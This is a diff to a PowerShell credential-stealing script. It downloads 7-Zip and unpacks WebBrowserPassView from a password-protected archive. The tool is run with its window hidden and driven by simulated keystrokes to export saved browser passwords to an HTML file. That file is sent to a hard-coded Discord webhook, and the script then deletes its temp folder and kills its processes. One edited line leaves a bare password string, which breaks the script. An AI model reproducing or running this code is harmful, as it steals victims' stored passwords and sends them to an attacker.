@@ -13,20 +13,23 @@ Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'
 Expand-Archive '7z.zip'
 & '.\7z\7za.exe' e 'wbpv.zip'
 
-$extractionPassword = 'wbpv28821@'
+wbpv28821@
 
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
 
+Add-Type -AssemblyName System.Windows.Forms
+
 Start-Sleep -Seconds 3
-SendKeys '^(a)'  # CTRL + A
+
+[System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
+[System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S
 Start-Sleep -Seconds 3
-SendKeys '^(s)'  # CTRL + S
-Start-Sleep -Seconds 3
-SendKeys 'export.html'  # File name
-SendKeys '{TAB}'  # Move to save button
-SendKeys 'h'  # Hit save
-Start-Sleep -Seconds 1
-SendKeys '%{F4}'  # ALT + F4 to close the application
+[System.Windows.Forms.SendKeys]::SendWait('export.html')
+[System.Windows.Forms.SendKeys]::SendWait('{TAB}')
+[System.Windows.Forms.SendKeys]::SendWait('h')
+Start-Sleep -Seconds 1.7
+[System.Windows.Forms.SendKeys]::SendWait('%{F4}')  # ALT + F4
+
 
 $webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
 $filePath = 'C:\temp\export.html'
@@ -37,6 +40,6 @@ Set-Location 'C:\temp'
 $tmpfolder = 'C:\temp'
 Remove-Item -Recurse -Force $tmpfolder
 
-TASKKILL /IM /F "7z.exe"
-TASKKILL /IM /F "7za.exe"
-TASKKILL /IM /F "powershell.exe"
+TASKKILL /IM "7z.exe"
+TASKKILL /IM "7za.exe"
+TASKKILL /IM "powershell.exe"
